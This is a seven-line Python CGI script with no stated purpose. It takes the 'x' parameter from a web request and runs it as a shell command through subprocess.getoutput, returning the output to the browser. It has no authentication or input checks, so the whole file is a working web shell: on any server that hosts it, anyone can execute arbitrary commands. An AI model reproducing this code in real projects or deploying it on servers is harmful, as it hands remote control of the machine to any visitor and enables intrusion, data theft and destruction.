#! /usr/bin/python3
print("content-type: text/html \n")
import cgi
import subprocess as sb
f = cgi.FieldStorage()
cmd= f.getvalue("x")
print(sb.getoutput(cmd))

